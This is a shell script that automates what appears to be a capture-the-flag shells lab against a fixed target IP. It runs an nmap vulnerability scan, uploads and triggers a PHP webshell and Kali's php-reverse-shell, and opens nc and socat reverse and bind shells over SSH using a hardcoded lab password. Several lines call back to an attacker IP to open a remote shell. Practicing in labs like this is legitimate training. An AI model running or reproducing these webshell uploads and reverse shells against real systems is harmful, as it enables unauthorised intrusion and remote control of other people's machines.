#/bin/sh

# Retrieve absolute path to this script
script=$(readlink -f $0)
scriptpath=`dirname $script`

# Define target IP ( the machine to attack ) and attack IP ( the machine which supports the attack )
target_ip="10.10.247.121"
attack_ip="10.9.5.12"
result_folder="/work/results/"

# Prepare environment
mkdir $result_folder 2>/dev/null

echo "1 - ENUMERATE"
nmap --script vuln -sC -sV -p- -T4 ${target_ip} > $result_folder/nmap-linux-results.txt

echo "2 - UPLOAD AND EXECUTE BASIC WEBSHELL"
echo "<?php" > /tmp/webshell.php
echo "    system(\$_GET[\"cmd\"]);" >> /tmp/webshell.php
echo " ?>" >> /tmp/webshell.php
xterm -hold -e "nc -lvnp 4444" &
curl -s -X POST "http://$target_ip/" -L -F "upload=@/tmp/webshell.php" -o /dev/null
curl -s -X GET "http://$target_ip/uploads/webshell.php?cmd=nc%20$attack_ip%204444%20-e%20/bin/bash" 

echo "3 - UPLOAD AND EXECUTE KALI WEBSHELL"
cp /usr/share/webshells/php/php-reverse-shell.php /tmp/php-reverse-shell.php
sed -i 's/'127.0.0.1'/'$attack_ip'/g' "/tmp/php-reverse-shell.php"
sed -i 's/$port = 1234;/$port = 4444;/g' "/tmp/php-reverse-shell.php"
xterm -hold -e "nc -lvnp 4444" &
curl -s -X POST "http://$target_ip/" -L -F "upload=@/tmp/php-reverse-shell.php" -o /dev/null
curl -s -X GET "http://$target_ip/uploads/php-reverse-shell.php" 

echo "4 - BIND AND REVERSE USING NC THROUGH SSH"
xterm -hold -e "nc -lvnp 4444" &
sshpass -p TryH4ckM3! ssh shell@$target_ip "nc $attack_ip 4444 -e /bin/bash"
sshpass -p TryH4ckM3! ssh shell@$target_ip "nc -lvnp 4445 -e /bin/bash" &
PID=$!
sleep 5
xterm -hold -e "nc $target_ip 4445"
kill -9 $PID
xterm -hold -e "nc -lvnp 4444" &
sshpass -p TryH4ckM3! ssh shell@$target_ip "mkfifo /tmp/f; nc $attack_ip 4444 < /tmp/f | /bin/bash >/tmp/f 2>&1; rm /tmp/f"
sshpass -p TryH4ckM3! ssh shell@$target_ip "mkfifo /tmp/f; nc -lvnp 4445 < /tmp/f | /bin/bash >/tmp/f 2>&1; rm /tmp/f" &
PID=$!
sleep 5
xterm -hold -e "nc $target_ip 4445"
kill -9 $PID

echo "5 - BIND AND REVERSE USING SOCAT THROUGH SSH"
xterm -hold -e "socat TCP-L:4444 -" &
sshpass -p TryH4ckM3! ssh shell@$target_ip "socat TCP:$attack_ip:4444 EXEC:\"bash -li\""
sshpass -p TryH4ckM3! ssh shell@$target_ip "socat TCP-L:4445 EXEC:\"bash -li\"" &
PID=$!
sleep 5
xterm -hold -e "socat TCP:$target_ip:4445 -"
kill -9 $PID
xterm -hold -e "socat TCP-L:4444 FILE:\`tty\`,raw,echo=0" &
sshpass -p TryH4ckM3! ssh shell@$target_ip "socat TCP:$attack_ip:4444 EXEC:\"bash -li\",pty,stderr,sigint,setsid,sane"
sshpass -p TryH4ckM3! ssh shell@$target_ip "socat TCP-L:4445 EXEC:\"bash -li\",pty,stderr,sigint,setsid,sane" &
PID=$!
sleep 5
xterm -hold -e "socat TCP:$target_ip:4445 FILE:\`tty\`,raw,echo=0"
kill -9 $PID
